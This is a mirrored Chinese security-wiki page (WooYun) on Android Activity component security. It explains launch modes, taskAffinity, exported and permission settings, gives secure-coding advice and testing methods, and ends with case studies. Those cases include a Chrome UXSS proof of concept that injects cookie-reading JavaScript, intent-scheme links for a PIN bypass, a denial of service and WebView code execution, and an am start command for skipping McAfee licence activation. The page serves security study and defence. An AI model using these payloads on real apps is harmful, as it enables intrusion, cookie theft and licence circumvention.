<!DOCTYPE html>
<html lang="zh" dir="ltr">

<!-- Mirrored from wiki.wooyun.org/_export/xhtml/client:activity by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8" />
  <title>client:activity</title>
<meta name="generator" content="DokuWiki"/>
<meta name="robots" content="index,follow"/>
<meta name="keywords" content="client,activity"/>
<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
<link rel="start" href="../../index.html"/>
<link rel="contents" href="../../client_activitydecf.html?do=index" title="网站地图"/>
<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feed8226.php?mode=list&amp;ns=client"/>
<link rel="alternate" type="text/html" title="纯HTML" href="client_activity.html"/>
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/activity.txt"/>
<link rel="canonical" href="../../client_activity.html"/>
<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
<script type="text/javascript">/*<![CDATA[*/var NS='client';var JSINFO = {"id":"client:activity","namespace":"client","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
</head>
<body>
<div class="dokuwiki export">
<!-- TOC START -->
<div id="dw__toc">
<h3 class="toggle">目录</h3>
<div>

<ul class="toc">
<li class="level1"><div class="li"><a href="#activity">Activity</a></div>
<ul class="toc">
<li class="clear">
<ul class="toc">
<li class="level3"><div class="li"><a href="#科普">1、科普</a></div></li>
<li class="level3"><div class="li"><a href="#知识要点">2、知识要点</a></div></li>
<li class="level3"><div class="li"><a href="#activity分类">3、Activity分类</a></div></li>
<li class="level3"><div class="li"><a href="#测试方法">4、测试方法</a></div></li>
<li class="level3"><div class="li"><a href="#案例">5、案例</a></div></li>
<li class="level3"><div class="li"><a href="#参考">6、参考</a></div></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->

<h1 class="sectionedit1" id="activity">Activity</h1>
<div class="level1">

</div>
<!-- EDIT1 SECTION "Activity" [1-25] -->
<h3 class="sectionedit2" id="科普">1、科普</h3>
<div class="level3">
<hr />

<p>
Android每一个Application都是由Activity、Service、content Provider和Broadcast Receiver等Android的基本组件所组成，其中Activity是实现应用程序的主体，它承担了大量的显示和交互工作，甚至可以理解为一个“界面”就是一个Activity。
</p>

<p>
Activity是为用户操作而展示的可视化用户界面。比如说，一个activity可以展示一个菜单项列表供用户选择，或者显示一些包含说明的照片。一个短消息应用程序可以包括一个用于显示做为发送对象的联系人的列表的activity，一个给选定的联系人写短信的activity以及翻阅以前的短信和改变设置的activity。尽管它们一起组成了一个内聚的用户界面，但其中每个activity都与其它的保持独立。每个都是以Activity类为基类的子类实现。
</p>

<p>
一个应用程序可以只有一个activity，或如刚才提到的短信应用程序那样，包含很多个。每个activity的作用，以及其数目，自然取决于应用程序及其设计。一般情况下，总有一个应用程序被标记为用户在应用程序启动的时候第一个看到的。从一个activity转向另一个的方式是靠当前的activity启动下一个。
</p>

</div>
<!-- EDIT2 SECTION "1、科普" [26-1290] -->
<h3 class="sectionedit3" id="知识要点">2、知识要点</h3>
<div class="level3">
<hr />

<p>
参考：<a href="http://developer.android.com/guide/components/activities.html" class="urlextern" title="http://developer.android.com/guide/components/activities.html"  rel="nofollow">Activities</a>
</p>

<p>
<strong>生命周期</strong>
</p>



<p>
<strong>启动方式</strong>
</p>

<p>
显示启动
</p>

<p>
配置文件中注册组件
</p>
<pre class="code java"><span class="sy0">&lt;</span>activity android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;.ExampleActivity&quot;</span> android<span class="sy0">:</span>icon<span class="sy0">=</span><span class="st0">&quot;@drawable/app_icon&quot;</span><span class="sy0">&gt;</span>
<span class="sy0">&lt;</span>intent<span class="sy0">-</span>filter<span class="sy0">&gt;</span>
<span class="sy0">&lt;</span>action android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;android.intent.action.MAIN&quot;</span> <span class="sy0">/&gt;</span>
<span class="sy0">&lt;</span>category android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;android.intent.category.LAUNCHER&quot;</span> <span class="sy0">/&gt;</span>
<span class="sy0">&lt;/</span>intent<span class="sy0">-</span>filter<span class="sy0">&gt;</span>
<span class="sy0">&lt;/</span>activity<span class="sy0">&gt;</span></pre>

<p>
直接使用intent对象指定application以及activity启动
</p>
<pre class="code java">Intent intent <span class="sy0">=</span> <span class="kw1">new</span> Intent<span class="br0">&#40;</span><span class="kw1">this</span>, ExampleActivity.<span class="kw1">class</span><span class="br0">&#41;</span><span class="sy0">;</span>
startActivity<span class="br0">&#40;</span>intent<span class="br0">&#41;</span><span class="sy0">;</span></pre>
<blockquote><div class="no">
未配置intent-filter的action属性，activity只能使用显示启动。<br/>
私有Activity推荐使用显示启动。</div></blockquote>

<p>
隐式启动
</p>
<pre class="code java">Intent intent <span class="sy0">=</span> <span class="kw1">new</span> Intent<span class="br0">&#40;</span>Intent.<span class="me1">ACTION_SEND</span><span class="br0">&#41;</span><span class="sy0">;</span>
intent.<span class="me1">putExtra</span><span class="br0">&#40;</span>Intent.<span class="me1">EXTRA_EMAIL</span>, recipientArray<span class="br0">&#41;</span><span class="sy0">;</span>
startActivity<span class="br0">&#40;</span>intent<span class="br0">&#41;</span><span class="sy0">;</span></pre>

<p>
<strong>加载模式launch mode</strong>
</p>

<p>
Activity有四种加载模式：
</p>
<ul>
<li class="level1"><div class="li"><strong>standard</strong>：默认行为。每次启动一个activity，系统都会在目标task新建一个实例。</div>
</li>
<li class="level1"><div class="li"><strong>singleTop</strong>:如果目标activity的实例已经存在于目标task的栈顶，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）</div>
</li>
<li class="level1"><div class="li"><strong>singleTask</strong>:在一个新任务的栈顶创建activity的实例。如果实例已经存在，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）</div>
</li>
<li class="level1"><div class="li"><strong>singleInstance</strong>:和“singleTask”类似，但在目标activity的task中不会再运行其他的activity，在那个task中永远只有一个activity。</div>
</li>
</ul>

<p>
设置的位置在AndroidManifest.xml文件中activity元素的android:launchMode 属性：
</p>
<pre class="code java"><span class="sy0">&lt;</span>activity android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;ActB&quot;</span> android<span class="sy0">:</span>launchMode<span class="sy0">=</span><span class="st0">&quot;singleTask&quot;</span><span class="sy0">&gt;&lt;/</span>activity<span class="sy0">&gt;</span></pre>

<p>
Activity launch mode 用于控制创建task和Activity实例。默认“standard“模式。Standard模式一次启动即会生成一个新的Activity实例并且不会创建新的task，被启动的Activity和启动的Activity在同一个栈中。当创建新的task时，intent中的内容有可能被恶意应用读取所以建议若无特别需求使用默认的standard模式即不配置launch mode属性。launchMode能被Intent 的flag覆盖。
</p>

<p>
<strong>taskAffinity</strong>
</p>

<p>
android系统中task管理Activity。Task的命名取决于root Activity的affinity。
</p>

<p>
默认情况下，app中的每个Activity都使用app的包名作为affinity。而Task的分配取决于app，故默认情况下一个app中所有的Activity属于同一task。要改变task的分配，可以在AndroidManifest.xml文件中设置affinity的值，但是这样做会有不同task启动Activity携带的intent中的信息被其他应用读取的风险。
</p>

<p>
<strong>FLAG_ACTIVITY_NEW_TASK</strong>
</p>

<p>
intent flag中一个重要的flag
</p>

<p>
启动Activity时通过setFlags()或者addFlags()方法设置intent的flags属性能够改变launch mode，FLAG_ACTIVITY_NEW_TASK标记代表创建新的task（被启动的Activity既不在前台也不在后台）。FLAG_ACTIVITY_MULTIPLE_TASK标记能和FLAG_ACTIVITY_NEW_TASK同时设置。这种情况下必会创建的task，所以intent中不应携带敏感数据。
</p>

<p>
<strong>Task</strong>
</p>

<p>
stack:Activity承担了大量的显示和交互工作，从某种角度上将，我们看见的应用程序就是许多个Activity的组合。为了让这许多 Activity协同工作而不至于产生混乱，Android平台设计了一种堆栈机制用于管理Activity，其遵循先进后出的原则，系统总是显示位于栈顶的Activity，位于栈顶的Activity也就是最后打开的Activity。
</p>

<p>
Task:是指将相关的Activity组合到一起，以Activity Stack的方式进行管理。从用户体验上讲，一个“应用程序”就是一个Task，但是从根本上讲，一个Task是可以有一个或多个Android Application组成的
</p>

<p>
如果用户离开一个task很长时间，系统会清理栈顶以下的activity，这样task被从新打开时，栈顶activity就被还原了。
</p>



<p>
<strong>Intent Selector</strong>
</p>

<p>
多个Activity具有相同action时，当此调用此action时会弹出一个选择器供用户选择。
</p>

<p>
<strong>权限</strong>
</p>

<p>
android:exported
</p>

<p>
一个Activity组件能否被外部应用启动取决于此属性，设置为true时Activity可以被外部应用启动，设置为false则不能，此时Activity只能被自身app启动。（同user id或者root也能启动）
</p>

<p>
没有配置intent-filter的action属性exported默认为false（没有filter只能通过明确的类名来启动activity故相当于只有程序本身能启动），配置了intent-filter的action属性exported默认为true。
</p>

<p>
exported属性只是用于限制Activity是否暴露给其他app，通过配置文件中的权限申明也可以限制外部启动activity。
</p>

<p>
android:protectionLevel
</p>

<p>
<a href="http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html" class="urlextern" title="http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html"  rel="nofollow">&lt;permission&gt;</a>
</p>





<p>
normal:默认值。低风险权限，只要申请了就可以使用，安装时不需要用户确认。
</p>

<p>
dangerous：像WRITE_SETTING和SEND_SMS等权限是有风险的，因为这些权限能够用来重新配置设备或者导致话费。使用此protectionLevel来标识用户可能关注的一些权限。Android将会在安装程序时，警示用户关于这些权限的需求，具体的行为可能依据Android版本或者所安装的移动设备而有所变化。
</p>

<p>
signature：这些权限仅授予那些和本程序应用了相同密钥来签名的程序。
</p>

<p>
signatureOrSystem:与signature类似，除了一点，系统中的程序也需要有资格来访问。这样允许定制Android系统应用也能获得权限，这种保护等级有助于集成系统编译过程。
</p>
<pre class="code java"><span class="sy0">&lt;!--</span> <span class="sy0">***</span> POINT <span class="nu0">1</span> <span class="sy0">***</span> Define a permission with protectionLevel<span class="sy0">=</span><span class="st0">&quot;signature&quot;</span> <span class="sy0">--&gt;</span>
<span class="sy0">&lt;</span>permission
android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;org.jssec.android.permission.protectedapp.MY_PERMISSION&quot;</span>
android<span class="sy0">:</span>protectionLevel<span class="sy0">=</span><span class="st0">&quot;signature&quot;</span> <span class="sy0">/&gt;</span>
<span class="sy0">&lt;</span>application
android<span class="sy0">:</span>icon<span class="sy0">=</span><span class="st0">&quot;@drawable/ic_launcher&quot;</span>
android<span class="sy0">:</span>label<span class="sy0">=</span><span class="st0">&quot;@string/app_name&quot;</span> <span class="sy0">&gt;</span>
<span class="sy0">&lt;!--</span> <span class="sy0">***</span> POINT <span class="nu0">2</span> <span class="sy0">***</span> <span class="kw1">For</span> a component, enforce the permission with its permission attribute <span class="sy0">--&gt;</span>
<span class="sy0">&lt;</span>activity
android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;.ProtectedActivity&quot;</span>
android<span class="sy0">:</span>exported<span class="sy0">=</span><span class="st0">&quot;true&quot;</span>
android<span class="sy0">:</span>label<span class="sy0">=</span><span class="st0">&quot;@string/app_name&quot;</span>
android<span class="sy0">:</span>permission<span class="sy0">=</span><span class="st0">&quot;org.jssec.android.permission.protectedapp.MY_PERMISSION&quot;</span> <span class="sy0">&gt;</span>
<span class="sy0">&lt;!--</span> <span class="sy0">***</span> POINT <span class="nu0">3</span> <span class="sy0">***</span> <span class="kw1">If</span> the component is an activity, you must define no intent<span class="sy0">-</span>filter <span class="sy0">--&gt;</span>
<span class="sy0">&lt;/</span>activity<span class="sy0">&gt;</span></pre>

<p>
<strong>关键方法</strong>
</p>
<ul>
<li class="level1"><div class="li">onCreate(Bundle savedInstanceState)</div>
</li>
<li class="level1"><div class="li">setResult(int resultCode, Intent data)</div>
</li>
<li class="level1"><div class="li">startActivity(Intent intent)</div>
</li>
<li class="level1"><div class="li">startActivityForResult(Intent intent, int requestCode)</div>
</li>
<li class="level1"><div class="li">onActivityResult(int requestCode, int resultCode, Intent data)</div>
</li>
<li class="level1"><div class="li">setResult (int resultCode, Intent data)</div>
</li>
<li class="level1"><div class="li">getStringExtra (String name)</div>
</li>
<li class="level1"><div class="li">addFlags(int flags)</div>
</li>
<li class="level1"><div class="li">setFlags(int flags)</div>
</li>
<li class="level1"><div class="li">setPackage(String packageName)</div>
</li>
<li class="level1"><div class="li">getAction()</div>
</li>
<li class="level1"><div class="li">setAction(String action)</div>
</li>
<li class="level1"><div class="li">getData()</div>
</li>
<li class="level1"><div class="li">setData(Uri data)</div>
</li>
<li class="level1"><div class="li">getExtras()</div>
</li>
<li class="level1"><div class="li">putExtra(String name, String value)</div>
</li>
</ul>

</div>
<!-- EDIT3 SECTION "2、知识要点" [1291-8185] -->
<h3 class="sectionedit4" id="activity分类">3、Activity分类</h3>
<div class="level3">
<hr />

<p>
Activity类型和使用方式决定了其风险和防御方式,故将Activity分类如下： Private、Public、Parter、In-house
</p>



</div>

<h4 id="private_activity">private activity</h4>
<div class="level4">

<p>
私有Activity不应被其他应用启动相对是安全的
</p>

<p>
创建activity时：
</p>

<p>
1、不指定taskAffinity <em>task管理activity。task的名字取决于根activity的affinity。默认设置中Activity使用包名做为affinity。task由app分配，所以一个应用的Activity在默认情况下属于相同task。跨task启动Activity的intent有可能被其他app读取到。

2、不指定lunchMode </em>默认standard，建议使用默认。创建新task时有可能被其他应用读取intent的内容。
</p>

<p>
3、设置exported属性为false
</p>

<p>
4、谨慎处理从intent中接收的数据，不管是否内部发送的intent
</p>

<p>
5、敏感信息只能在应用内部操作
</p>

<p>
使用activity时：
</p>

<p>
6、开启activity时不设置
</p>
<pre class="code">FLAG\_ACTIVITY\_NEW\_TASK</pre>

<p>
标签
</p>
<pre class="code"> //FLAG\_ACTIVITY\_NEW\_TASK</pre>

<p>
标签用于创建新task（被启动的Activity并未在栈中）。
</p>

<p>
7、开启应用内部activity使用显示启动的方式
</p>

<p>
8、当putExtra()包含敏感信息目的应是app内的activity
</p>

<p>
9、谨慎处理返回数据，即可数据来自相同应用
</p>

</div>

<h4 id="public_activity">public activity</h4>
<div class="level4">

<p>
公开暴露的Activity组件，可以被任意应用启动
</p>

<p>
创建activity：
</p>

<p>
1、设置exported属性为true
</p>

<p>
2、谨慎处理接收的intent
</p>

<p>
3、有返回数据时不应包含敏感信息
</p>

<p>
使用activity：
</p>

<p>
4、不应发送敏感信息
</p>

<p>
5、当收到返回数据时谨慎处理
</p>

<p>
Parter、in-house部分参阅<a href="http://www.jssec.org/dl/android/_securecoding/_en.pdf" class="urlextern" title="http://www.jssec.org/dl/android\_securecoding\_en.pdf"  rel="nofollow">Android Application Secure Design/Secure Coding Guidebook</a>
</p>

<p>
<strong>安全建议</strong>
</p>
<ul>
<li class="level1"><div class="li">app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false。</div>
</li>
<li class="level1"><div class="li">使用默认taskAffinity</div>
</li>
<li class="level1"><div class="li">使用默认launchMode</div>
</li>
<li class="level1"><div class="li">启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</div>
</li>
<li class="level1"><div class="li">谨慎处理接收的intent以及其携带的信息</div>
</li>
<li class="level1"><div class="li">签名验证内部（in-house）app</div>
</li>
<li class="level1"><div class="li">当Activity返回数据时候需注意目标Activity是否有泄露信息的风险</div>
</li>
<li class="level1"><div class="li">目的Activity十分明确时使用显示启动</div>
</li>
<li class="level1"><div class="li">谨慎处理Activity返回的数据，目的Activity返回的数据有可能是恶意应用伪造的</div>
</li>
<li class="level1"><div class="li">验证目标Activity是否恶意app，以免受到intent欺骗，可用hash签名验证</div>
</li>
<li class="level1"><div class="li">When Providing an Asset Secondhand, the Asset should be Protected with the Same Level of Protection</div>
</li>
<li class="level1"><div class="li">尽可能的不发送敏感信息，应考虑到启动public Activity中intent的信息均有可能被恶意应用窃取的风险</div>
</li>
</ul>

</div>
<!-- EDIT4 SECTION "3、Activity分类" [8186-10823] -->
<h3 class="sectionedit5" id="测试方法">4、测试方法</h3>
<div class="level3">
<hr />

<p>
查看activity：
</p>
<ul>
<li class="level1"><div class="li">反编译查看配置文件AndroidManifest.xml中activity组件（关注配置了intent-filter的及未设置export=“false”的）</div>
</li>
<li class="level1"><div class="li">直接用RE打开安装后的app查看配置文件</div>
</li>
<li class="level1"><div class="li">Drozer扫描:run app.activity.info -a packagename</div>
</li>
<li class="level1"><div class="li">动态查看：logcat设置filter的tag为ActivityManager</div>
</li>
</ul>

<p>
启动activity：
</p>
<ul>
<li class="level1"><div class="li">adb shell：am start -a action -n package/componet</div>
</li>
<li class="level1"><div class="li">drozer: run app.activity.start –action android.action.intent.VIEW …</div>
</li>
<li class="level1"><div class="li">自己编写app调用startActiviy()或startActivityForResult()</div>
</li>
<li class="level1"><div class="li">浏览器intent scheme远程启动:<a href="http://drops.wooyun.org/tips/2893" class="urlextern" title="http://drops.wooyun.org/tips/2893"  rel="nofollow">Intent scheme URL attack</a></div>
</li>
</ul>

</div>
<!-- EDIT5 SECTION "4、测试方法" [10824-11488] -->
<h3 class="sectionedit6" id="案例">5、案例</h3>
<div class="level3">
<hr />

<p>
<strong>案例1：绕过本地认证</strong>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-048502" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-048502"  rel="nofollow">华为网盘android客户端本地密码绕过（非root也可以）</a>
</p>

<p>
绕过McAfee的key验证，免费激活：
</p>

<p>
$ am start -a android.intent.action.MAIN -n com.wsandroid.suite/com.mcafee.main.MfeMain
</p>



<p>
<strong>案例2：本地拒绝服务</strong>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-060423" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-060423"  rel="nofollow">快玩浏览器android客户端本地拒绝服务</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2010-036581" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-036581"  rel="nofollow">雪球android客户端本地拒绝服务漏洞</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2014-048176" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2014-048176"  rel="nofollow">Tencent Messenger(QQ) Dos vulnerability(critical)</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2014-048501" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2014-048501"  rel="nofollow">Tencent WeiBo multiple Dos vulnerabilities(critical)</a>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2014-077688" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2014-077688"  rel="nofollow">Android原生的Settings应用存在必现崩溃问题（可造成拒绝服务攻击）</a>  (涉及fragment)
</p>

<p>
<strong>案例3：界面劫持</strong>
</p>

<p>
<a href="http://www.wooyun.org/bugs/wooyun-2012-05478" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2012-05478"  rel="nofollow">android利用悬浮窗口实现界面劫持钓鱼盗号</a>
</p>

<p>
<strong>案例4：UXSS</strong>
</p>

<p>
漏洞存在于Chrome Android版本v18.0.1025123，class “com.google.android.apps.chrome.SimpleChromeActivity” 允许恶意应用注入js代码到任意域. 部分 AndroidManifest.xml配置文件如下
</p>
<pre class="code java"><span class="sy0">&lt;</span>activity android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;com.google.android.apps.chrome.SimpleChromeActivity&quot;</span> android<span class="sy0">:</span>launchMode<span class="sy0">=</span><span class="st0">&quot;singleTask&quot;</span> android<span class="sy0">:</span>configChanges<span class="sy0">=</span><span class="st0">&quot;keyboard|keyboardHidden|orientation|screenSize&quot;</span><span class="sy0">&gt;</span>
<span class="sy0">&lt;</span>intent<span class="sy0">-</span>filter<span class="sy0">&gt;</span>
<span class="sy0">&lt;</span>action android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;android.intent.action.VIEW&quot;</span> <span class="sy0">/&gt;</span>
<span class="sy0">&lt;</span>category android<span class="sy0">:</span>name<span class="sy0">=</span><span class="st0">&quot;android.intent.category.DEFAULT&quot;</span> <span class="sy0">/&gt;</span>
<span class="sy0">&lt;/</span>intent<span class="sy0">-</span>filter<span class="sy0">&gt;</span>
<span class="sy0">&lt;/</span>activity<span class="sy0">&gt;</span></pre>

<p>
Class “com.google.android.apps.chrome.SimpleChromeActivity” 配置 &lt;intent-filter&gt;但是未设置 “android:exported” 为 “false”. 恶意应用先调用该类并设置data为” <a href="http://google.com/" class="urlextern" title="http://google.com"  rel="nofollow">http://google.com</a>” 再次调用时设置data为恶意js例如&#039;javascript:alert(document.cookie)&#039;, 恶意代码将在<a href="http://google.com/" class="urlextern" title="http://google.com"  rel="nofollow">http://google.com</a>域中执行. “com.google.android.apps.chrome.SimpleChromeActivity” class 可以通过Android api或者am（activityManager）打开. POC如下
</p>
<pre class="code java"><span class="kw1">public</span> <span class="kw1">class</span> TestActivity <span class="kw1">extends</span> Activity <span class="br0">&#123;</span>
@Override
<span class="kw1">public</span> <span class="kw4">void</span> onCreate<span class="br0">&#40;</span>Bundle savedInstanceState<span class="br0">&#41;</span> <span class="br0">&#123;</span>
<span class="kw1">super</span>.<span class="me1">onCreate</span><span class="br0">&#40;</span>savedInstanceState<span class="br0">&#41;</span><span class="sy0">;</span>
Intent i <span class="sy0">=</span> <span class="kw1">new</span> Intent<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
ComponentName comp <span class="sy0">=</span> <span class="kw1">new</span> ComponentName<span class="br0">&#40;</span>
<span class="st0">&quot;com.android.chrome&quot;</span>,
<span class="st0">&quot;com.google.android.apps.chrome.SimpleChromeActivity&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
i.<span class="me1">setComponent</span><span class="br0">&#40;</span>comp<span class="br0">&#41;</span><span class="sy0">;</span>
i.<span class="me1">setAction</span><span class="br0">&#40;</span><span class="st0">&quot;android.intent.action.VIEW&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
Uri data <span class="sy0">=</span> Uri.<span class="me1">parse</span><span class="br0">&#40;</span><span class="st0">&quot;http://google.com&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
i.<span class="me1">setData</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
startActivity<span class="br0">&#40;</span>i<span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">try</span> <span class="br0">&#123;</span>
<a href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+thread"><span class="kw3">Thread</span></a>.<span class="me1">sleep</span><span class="br0">&#40;</span><span class="nu0">5000</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">catch</span> <span class="br0">&#40;</span><a href="http://www.google.com/search?hl=en&amp;q=allinurl%3Adocs.oracle.com+javase+docs+api+exception"><span class="kw3">Exception</span></a> e<span class="br0">&#41;</span> <span class="br0">&#123;</span><span class="br0">&#125;</span>
&nbsp;
data <span class="sy0">=</span> Uri.<span class="me1">parse</span><span class="br0">&#40;</span><span class="st0">&quot;javascript:alert(document.cookie)&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span> 
i.<span class="me1">setData</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
startActivity<span class="br0">&#40;</span>i<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre>

<p>
<strong>案例5：隐式启动intent包含敏感数据</strong>
</p>

<p>
暂缺可公开案例,攻击模型如下图。
</p>



<p>
<strong>案例6：Fragment注入(绕过PIN+拒绝服务)</strong>
</p>

<p>
Fragment这里只提一下，以后可能另写一篇。
</p>
<pre class="code html4strict"><span class="sc2">&lt;<a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a> <span class="kw3">href</span><span class="sy0">=</span><span class="st0">&quot;intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end&quot;</span>&gt;</span>16、bypass Pin android 3.0-4.3 （selector）<span class="sc2">&lt;<span class="sy0">/</span><a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a>&gt;&lt;<a href="http://december.com/html/4/element/br.html"><span class="kw2">br</span></a>&gt;</span></pre>


<pre class="code html4strict"><span class="sc2">&lt;<a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a> <span class="kw3">href</span><span class="sy0">=</span><span class="st0">&quot;intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end&quot;</span>&gt;</span>17、fragment dos android 4.4 (selector)<span class="sc2">&lt;<span class="sy0">/</span><a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a>&gt;&lt;<a href="http://december.com/html/4/element/br.html"><span class="kw2">br</span></a>&gt;</span></pre>



<p>
<strong>案例7:webview RCE</strong>
</p>
<pre class="code html4strict"><span class="sc2">&lt;<a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a> <span class="kw3">href</span><span class="sy0">=</span><span class="st0">&quot;intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end&quot;</span>&gt;</span>15、驴妈妈代码执行（fixed）<span class="sc2">&lt;<span class="sy0">/</span><a href="http://december.com/html/4/element/a.html"><span class="kw2">a</span></a>&gt;&lt;<a href="http://december.com/html/4/element/br.html"><span class="kw2">br</span></a>&gt;</span></pre>





</div>
<!-- EDIT6 SECTION "5、案例" [11489-15168] -->
<h3 class="sectionedit7" id="参考">6、参考</h3>
<div class="level3">
<hr />

<p>
<a href="http://www.jssec.org/dl/android/_securecoding/_en.pdf" class="urlextern" title="http://www.jssec.org/dl/android\_securecoding\_en.pdf"  rel="nofollow">Android Application Secure Design/Secure Coding Guidebook</a>

</p>

</div>
<!-- EDIT7 SECTION "6、参考" [15169-] --></div>
</body>

<!-- Mirrored from wiki.wooyun.org/_export/xhtml/client:activity by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
</html>
